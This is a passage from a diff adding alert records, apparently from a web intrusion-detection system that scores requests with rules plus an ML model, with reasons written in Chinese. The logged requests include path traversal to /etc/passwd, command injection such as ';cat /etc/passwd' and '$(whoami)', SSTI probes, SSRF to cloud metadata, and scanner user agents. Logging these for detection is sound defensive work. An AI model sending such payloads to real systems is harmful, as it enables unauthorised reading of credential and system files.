\"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 5, \"query_length\": 32, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 245,
+      "timestamp": "2026-11-07 22:59:37",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "path_traversal_ai_detected",
+      "src_ip": "198.51.100.77",
+      "raw_request_id": 145,
+      "payload": "[AI判定path_traversal] GET /page?file=..\\..\\..\\windows\\win.ini | [query.file] 规则命中 path_traversal(+22): 检测到路径遍历攻击 ..\\；模型判定: path_traversal(1.00)",
+      "extra": "{\"score\": 47, \"signals\": [\"目录穿越/LFI特征\", \"AI判定path_traversal(+25分): [query.file] 规则命中 path_traversal(+22): 检测到路径遍历攻击 ..\\\\；模型判定: path_traversal(1.00)\"], \"method\": \"GET\", \"path\": \"/page\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 22, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"path_traversal\", \"is_attack\": true, \"attack_prob\": 1.0, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.file] 规则命中 path_traversal(+22): 检测到路径遍历攻击 ..\\\\；模型判定: path_traversal(1.00)\"], \"signals\": [{\"field\": \"query.file\", \"value\": \"..%5C..%5C..%5Cwindows%5Cwin.ini\", \"attack_type\": \"path_traversal\", \"attack_prob\": 1.0, \"ai_points\": 25, \"fusion_score\": 47, \"high_risk\": true, \"reason\": \"规则命中 path_traversal(+22): 检测到路径遍历攻击 ..\\\\；模型判定: path_traversal(1.00)\"}], \"model_label\": \"path_traversal\", \"source\": \"web\", \"ip\": \"198.51.100.*\", \"session_id\": \"e0ac3ef3fc71402e\", \"request_id\": \"\", \"latency_ms\": 18.004, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 5, \"query_length\": 37, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 246,
+      "timestamp": "2026-11-07 22:59:38",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "path_traversal_ai_detected",
+      "src_ip": "192.0.2.31",
+      "raw_request_id": 146,
+      "payload": "[AI判定path_traversal] GET /page?file=....//....//etc/passwd | [query.file] 规则命中 path_traversal(+22): 检测到路径遍历攻击 ../；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: path_traversal(1",
+      "extra": "{\"score\": 47, \"signals\": [\"目录穿越/LFI特征\", \"AI判定path_traversal(+25分): [query.file] 规则命中 path_traversal(+22): 检测到路径遍历攻击 ../；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: path_traversal(1.00)\"], \"method\": \"GET\", \"path\": \"/page\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 22, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"path_traversal\", \"is_attack\": true, \"attack_prob\": 1.0, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.file] 规则命中 path_traversal(+22): 检测到路径遍历攻击 ../；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: path_traversal(1.00)\"], \"signals\": [{\"field\": \"query.file\", \"value\": \"....//....//etc/passwd\", \"attack_type\": \"path_traversal\", \"attack_prob\": 1.0, \"ai_points\": 25, \"fusion_score\": 47, \"high_risk\": true, \"reason\": \"规则命中 path_traversal(+22): 检测到路径遍历攻击 ../；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: path_traversal(1.00)\"}], \"model_label\": \"path_traversal\", \"source\": \"web\", \"ip\": \"192.0.2.*\", \"session_id\": \"ae47f50684b7e372\", \"request_id\": \"\", \"latency_ms\": 19.681, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 5, \"query_length\": 27, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 247,
+      "timestamp": "2026-11-07 22:59:39",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "sensitive_path_ai_detected",
+      "src_ip": "192.0.2.88",
+      "raw_request_id": 147,
+      "payload": "[AI判定sensitive_path] GET /.env | [path] 规则命中 sensitive_path(+20): 命中敏感路径探测特征: .env；模型判定: sensitive_path(0.99)",
+      "extra": "{\"score\": 40, \"signals\": [\"敏感路径: /.env\", \"AI判定sensitive_path(+25分): [path] 规则命中 sensitive_path(+20): 命中敏感路径探测特征: .env；模型判定: sensitive_path(0.99)\"], \"method\": \"GET\", \"path\": \"/.env\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 15, \"is_suspicious\": false}, \"ai\": {\"attack_type\": \"sensitive_path\", \"is_attack\": true, \"attack_prob\": 0.9951, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[path] 规则命中 sensitive_path(+20): 命中敏感路径探测特征: .env；模型判定: sensitive_path(0.99)\"], \"signals\": [{\"field\": \"path\", \"value\": \"/.env\", \"attack_type\": \"sensitive_path\", \"attack_prob\": 0.9951, \"ai_points\": 25, \"fusion_score\": 45, \"high_risk\": true, \"reason\": \"规则命中 sensitive_path(+20): 命中敏感路径探测特征: .env；模型判定: sensitive_path(0.99)\"}], \"model_label\": \"sensitive_path\", \"source\": \"web\", \"ip\": \"192.0.2.*\", \"session_id\": \"5c71142218844f27\", \"request_id\": \"\", \"latency_ms\": 32.178, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 5, \"query_length\": 0, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 248,
+      "timestamp": "2026-11-07 22:59:39",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "sensitive_path_ai_detected",
+      "src_ip": "192.0.2.200",
+      "raw_request_id": 148,
+      "payload": "[AI判定sensitive_path] GET /.git/config | [path] 规则命中 sensitive_path(+20): 命中敏感路径探测特征: .git/；模型判定: sensitive_path(1.00)",
+      "extra": "{\"score\": 55, \"signals\": [\"敏感路径: /config\", \"敏感路径: /.git\", \"AI判定sensitive_path(+25分): [path] 规则命中 sensitive_path(+20): 命中敏感路径探测特征: .git/；模型判定: sensitive_path(1.00)\"], \"method\": \"GET\", \"path\": \"/.git/config\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 30, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"sensitive_path\", \"is_attack\": true, \"attack_prob\": 0.9993, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[path] 规则命中 sensitive_path(+20): 命中敏感路径探测特征: .git/；模型判定: sensitive_path(1.00)\"], \"signals\": [{\"field\": \"path\", \"value\": \"/.git/config\", \"attack_type\": \"sensitive_path\", \"attack_prob\": 0.9993, \"ai_points\": 25, \"fusion_score\": 45, \"high_risk\": true, \"reason\": \"规则命中 sensitive_path(+20): 命中敏感路径探测特征: .git/；模型判定: sensitive_path(1.00)\"}], \"model_label\": \"sensitive_path\", \"source\": \"web\", \"ip\": \"192.0.2.*\", \"session_id\": \"a68093cc7f459145\", \"request_id\": \"\", \"latency_ms\": 38.597, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 12, \"query_length\": 0, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 249,
+      "timestamp": "2026-11-07 22:59:40",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "sensitive_path_ai_detected",
+      "src_ip": "203.0.113.17",
+      "raw_request_id": 149,
+      "payload": "[AI判定sensitive_path] GET /dump.sql | [path] 规则命中 sensitive_path(+20): 命中敏感路径探测特征: dump.sql；模型判定: sensitive_path(0.99)",
+      "extra": "{\"score\": 40, \"signals\": [\"AI判定sensitive_path(+25分): [path] 规则命中 sensitive_path(+20): 命中敏感路径探测特征: dump.sql；模型判定: sensitive_path(0.99)\"], \"method\": \"GET\", \"path\": \"/dump.sql\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 0, \"is_suspicious\": false}, \"ai\": {\"attack_type\": \"sensitive_path\", \"is_attack\": true, \"attack_prob\": 0.996, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[path] 规则命中 sensitive_path(+20): 命中敏感路径探测特征: dump.sql；模型判定: sensitive_path(0.99)\"], \"signals\": [{\"field\": \"path\", \"value\": \"/dump.sql\", \"attack_type\": \"sensitive_path\", \"attack_prob\": 0.996, \"ai_points\": 25, \"fusion_score\": 45, \"high_risk\": true, \"reason\": \"规则命中 sensitive_path(+20): 命中敏感路径探测特征: dump.sql；模型判定: sensitive_path(0.99)\"}], \"model_label\": \"sensitive_path\", \"source\": \"web\", \"ip\": \"203.0.113.*\", \"session_id\": \"b48e316ec7464e33\", \"request_id\": \"\", \"latency_ms\": 14.186, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 9, \"query_length\": 0, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 250,
+      "timestamp": "2026-11-07 22:59:41",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "sensitive_path_ai_detected",
+      "src_ip": "203.0.113.45",
+      "raw_request_id": 150,
+      "payload": "[AI判定sensitive_path] GET /backup.zip | [path] 规则命中 sensitive_path(+20): 命中敏感路径探测特征: backup；模型判定: sensitive_path(1.00)",
+      "extra": "{\"score\": 40, \"signals\": [\"敏感路径: /backup\", \"AI判定sensitive_path(+25分): [path] 规则命中 sensitive_path(+20): 命中敏感路径探测特征: backup；模型判定: sensitive_path(1.00)\"], \"method\": \"GET\", \"path\": \"/backup.zip\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 15, \"is_suspicious\": false}, \"ai\": {\"attack_type\": \"sensitive_path\", \"is_attack\": true, \"attack_prob\": 0.9981, \"ai_points\": 25, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[path] 规则命中 sensitive_path(+20): 命中敏感路径探测特征: backup；模型判定: sensitive_path(1.00)\"], \"signals\": [{\"field\": \"path\", \"value\": \"/backup.zip\", \"attack_type\": \"sensitive_path\", \"attack_prob\": 0.9981, \"ai_points\": 25, \"fusion_score\": 45, \"high_risk\": true, \"reason\": \"规则命中 sensitive_path(+20): 命中敏感路径探测特征: backup；模型判定: sensitive_path(1.00)\"}], \"model_label\": \"sensitive_path\", \"source\": \"web\", \"ip\": \"203.0.113.*\", \"session_id\": \"0f9ecdf3342cee43\", \"request_id\": \"\", \"latency_ms\": 36.654, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 25, \"ai_service_points\": 25, \"ai_input\": {\"path_length\": 11, \"query_length\": 0, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 251,
+      "timestamp": "2026-11-07 22:59:42",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "scanner_probe",
+      "src_ip": "198.51.100.23",
+      "raw_request_id": 152,
+      "payload": "[疑似扫描器探测] GET /",
+      "extra": "{\"score\": 22, \"signals\": [\"扫描工具特征: sqlmap\"], \"method\": \"GET\", \"path\": \"/\", \"ua\": \"sqlmap/1.8.7#stable (https://sqlmap.org)\", \"rule\": {\"score\": 22, \"is_suspicious\": true}, \"ai\": {}, \"ai_applied\": false, \"ai_points\": 0, \"ai_service_points\": 0, \"ai_input\": {\"path_length\": 1, \"query_length\": 0, \"body_length\": 0, \"user_agent_length\": 40}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule\"}"
+    },
+    {
+      "id": 252,
+      "timestamp": "2026-11-07 22:59:43",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "scanner_probe",
+      "src_ip": "198.51.100.77",
+      "raw_request_id": 153,
+      "payload": "[疑似扫描器探测] GET /",
+      "extra": "{\"score\": 20, \"signals\": [\"扫描工具特征\"], \"method\": \"GET\", \"path\": \"/\", \"ua\": \"Nikto/2.1.6\", \"rule\": {\"score\": 20, \"is_suspicious\": true}, \"ai\": {}, \"ai_applied\": false, \"ai_points\": 0, \"ai_service_points\": 0, \"ai_input\": {\"path_length\": 1, \"query_length\": 0, \"body_length\": 0, \"user_agent_length\": 11}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule\"}"
+    },
+    {
+      "id": 253,
+      "timestamp": "2026-11-07 22:59:43",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "scanner_probe",
+      "src_ip": "192.0.2.31",
+      "raw_request_id": 154,
+      "payload": "[疑似扫描器探测] GET /",
+      "extra": "{\"score\": 22, \"signals\": [\"扫描工具特征: nmap\"], \"method\": \"GET\", \"path\": \"/\", \"ua\": \"Mozilla/5.0 (Nmap Scripting Engine)\", \"rule\": {\"score\": 22, \"is_suspicious\": true}, \"ai\": {}, \"ai_applied\": false, \"ai_points\": 0, \"ai_service_points\": 0, \"ai_input\": {\"path_length\": 1, \"query_length\": 0, \"body_length\": 0, \"user_agent_length\": 35}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule\"}"
+    },
+    {
+      "id": 254,
+      "timestamp": "2026-11-07 22:59:44",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "sensitive_path_ai_detected",
+      "src_ip": "192.0.2.88",
+      "raw_request_id": 155,
+      "payload": "[AI判定sensitive_path] GET /tools?cmd=127.0.0.1;cat /etc/passwd | [query.cmd] 规则命中 sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: sensitive_path(0.92)",
+      "extra": "{\"score\": 51, \"signals\": [\"疑似命令执行/WebShell特征\", \"AI判定sensitive_path(+23分): [query.cmd] 规则命中 sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: sensitive_path(0.92)\"], \"method\": \"GET\", \"path\": \"/tools\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 28, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"sensitive_path\", \"is_attack\": true, \"attack_prob\": 0.9362, \"ai_points\": 23, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.cmd] 规则命中 sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: sensitive_path(0.92)\"], \"signals\": [{\"field\": \"query.cmd\", \"value\": \"127.0.0.1;cat%20/etc/passwd\", \"attack_type\": \"sensitive_path\", \"attack_prob\": 0.9362, \"ai_points\": 23, \"fusion_score\": 43, \"high_risk\": true, \"reason\": \"规则命中 sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: sensitive_path(0.92)\"}], \"model_label\": \"sensitive_path\", \"source\": \"web\", \"ip\": \"192.0.2.*\", \"session_id\": \"5c71142218844f27\", \"request_id\": \"\", \"latency_ms\": 29.691, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 23, \"ai_service_points\": 23, \"ai_input\": {\"path_length\": 6, \"query_length\": 31, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 255,
+      "timestamp": "2026-11-07 22:59:44",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "webshell_probe",
+      "src_ip": "192.0.2.200",
+      "raw_request_id": 156,
+      "payload": "[疑似WebShell访问] GET /tools?cmd=$(whoami)",
+      "extra": "{\"score\": 28, \"signals\": [\"疑似命令执行/WebShell特征\", \"AI判定normal(+0分)\"], \"method\": \"GET\", \"path\": \"/tools\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 28, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"normal\", \"is_attack\": false, \"attack_prob\": 0.442, \"ai_points\": 11, \"confidence\": 0.558, \"high_risk\": false, \"reasons\": [], \"signals\": [], \"model_label\": \"normal\", \"source\": \"web\", \"ip\": \"192.0.2.*\", \"session_id\": \"a68093cc7f459145\", \"request_id\": \"\", \"latency_ms\": 63.406, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 0, \"ai_service_points\": 11, \"ai_input\": {\"path_length\": 6, \"query_length\": 13, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 256,
+      "timestamp": "2026-11-07 22:59:46",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "ssti_probe",
+      "src_ip": "203.0.113.45",
+      "raw_request_id": 158,
+      "payload": "[疑似模板注入] GET /search?name={{7*7}}",
+      "extra": "{\"score\": 20, \"signals\": [\"疑似SSTI模板注入\", \"AI判定normal(+0分)\"], \"method\": \"GET\", \"path\": \"/search\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 20, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"normal\", \"is_attack\": false, \"attack_prob\": 0.442, \"ai_points\": 11, \"confidence\": 0.558, \"high_risk\": false, \"reasons\": [], \"signals\": [], \"model_label\": \"normal\", \"source\": \"web\", \"ip\": \"203.0.113.*\", \"session_id\": \"0f9ecdf3342cee43\", \"request_id\": \"\", \"latency_ms\": 57.755, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 0, \"ai_service_points\": 11, \"ai_input\": {\"path_length\": 7, \"query_length\": 20, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 257,
+      "timestamp": "2026-11-07 22:59:46",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "ssti_probe",
+      "src_ip": "203.0.113.99",
+      "raw_request_id": 159,
+      "payload": "[疑似模板注入] GET /search?name=${7*7}",
+      "extra": "{\"score\": 40, \"signals\": [\"疑似SSTI模板注入\", \"疑似表达式注入特征\", \"AI判定normal(+0分)\"], \"method\": \"GET\", \"path\": \"/search\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 40, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"normal\", \"is_attack\": false, \"attack_prob\": 0.442, \"ai_points\": 11, \"confidence\": 0.558, \"high_risk\": false, \"reasons\": [], \"signals\": [], \"model_label\": \"normal\", \"source\": \"web\", \"ip\": \"203.0.113.*\", \"session_id\": \"b2ecd9ac1fd19f22\", \"request_id\": \"\", \"latency_ms\": 55.057, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 0, \"ai_service_points\": 11, \"ai_input\": {\"path_length\": 7, \"query_length\": 15, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 258,
+      "timestamp": "2026-11-07 22:59:47",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "sensitive_path_ai_detected",
+      "src_ip": "198.51.100.77",
+      "raw_request_id": 161,
+      "payload": "[AI判定sensitive_path] GET /api/preview?url=http://169.254.169.254/latest/meta-data/ | [query.url] 规则命中 sensitive_path(+20): 试图访问云元数据服务 169.254.169.254；模型判定: sensitive_path(0.97)",
+      "extra": "{\"score\": 54, \"signals\": [\"疑似SSRF特征(内网/云元数据)\", \"AI判定sensitive_path(+24分): [query.url] 规则命中 sensitive_path(+20): 试图访问云元数据服务 169.254.169.254；模型判定: sensitive_path(0.97)\"], \"method\": \"GET\", \"path\": \"/api/preview\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 30, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"sensitive_path\", \"is_attack\": true, \"attack_prob\": 0.9788, \"ai_points\": 24, \"confidence\": 0.99, \"high_risk\": true, \"reasons\": [\"[query.url] 规则命中 sensitive_path(+20): 试图访问云元数据服务 169.254.169.254；模型判定: sensitive_path(0.97)\"], \"signals\": [{\"field\": \"query.url\", \"value\": \"http://169.254.169.254/latest/meta-data/\", \"attack_type\": \"sensitive_path\", \"attack_prob\": 0.9788, \"ai_points\": 24, \"fusion_score\": 44, \"high_risk\": true, \"reason\": \"规则命中 sensitive_path(+20): 试图访问云元数据服务 169.254.169.254；模型判定: sensitive_path(0.97)\"}], \"model_label\": \"sensitive_path\", \"source\": \"web\", \"ip\": \"198.51.100.*\", \"session_id\": \"e0ac3ef3fc71402e\", \"request_id\": \"\", \"latency_ms\": 40.672, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 24, \"ai_service_points\": 24, \"ai_input\": {\"path_length\": 12, \"query_length\": 44, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 259,
+      "timestamp": "2026-11-07 22:59:50",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "path_traversal_ai_detected",
+      "src_ip": "192.0.2.31",
+      "raw_request_id": 162,
+      "payload": "[AI判定path_traversal] GET /api/preview?url=file:///etc/passwd | [query.url] 规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: sensitive_",
+      "extra": "{\"score\": 20, \"signals\": [\"AI判定path_traversal(+0分): [query.url] 规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: sensitive_path(1.00)\"], \"method\": \"GET\", \"path\": \"/api/preview\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 0, \"is_suspicious\": false}, \"ai\": {\"attack_type\": \"path_traversal\", \"is_attack\": true, \"attack_prob\": 0.9997, \"ai_points\": 0, \"confidence\": 0.99, \"high_risk\": false, \"reasons\": [\"[query.url] 规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: sensitive_path(1.00)\"], \"signals\": [{\"field\": \"query.url\", \"value\": \"file:///etc/passwd\", \"attack_type\": \"path_traversal\", \"attack_prob\": 0.9997, \"ai_points\": 0, \"fusion_score\": 22, \"high_risk\": false, \"reason\": \"规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: sensitive_path(1.00)\"}], \"model_label\": \"path_traversal\", \"source\": \"web\", \"ip\": \"192.0.2.*\", \"session_id\": \"ae47f50684b7e372\", \"request_id\": \"\", \"latency_ms\": 20.495, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 0, \"ai_service_points\": 0, \"ai_input\": {\"path_length\": 12, \"query_length\": 22, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 260,
+      "timestamp": "2026-11-07 22:59:52",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "ssrf_probe",
+      "src_ip": "192.0.2.88",
+      "raw_request_id": 163,
+      "payload": "[疑似SSRF探测] GET /api/preview?url=http://127.0.0.1:5001/",
+      "extra": "{\"score\": 30, \"signals\": [\"疑似SSRF特征(内网/云元数据)\", \"AI判定normal(+0分)\"], \"method\": \"GET\", \"path\": \"/api/preview\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 30, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"normal\", \"is_attack\": false, \"attack_prob\": 0.442, \"ai_points\": 11, \"confidence\": 0.558, \"high_risk\": false, \"reasons\": [], \"signals\": [], \"model_label\": \"normal\", \"source\": \"web\", \"ip\": \"192.0.2.*\", \"session_id\": \"5c71142218844f27\", \"request_id\": \"\", \"latency_ms\": 55.606, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 0, \"ai_service_points\": 11, \"ai_input\": {\"path_length\": 12, \"query_length\": 26, \"body_length\": 0, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 261,
+      "timestamp": "2026-11-07 22:59:54",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "path_traversal_ai_detected",
+      "src_ip": "192.0.2.200",
+      "raw_request_id": 164,
+      "payload": "[AI判定path_traversal] POST /api/preview | [body] 规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: xss(0.49)",
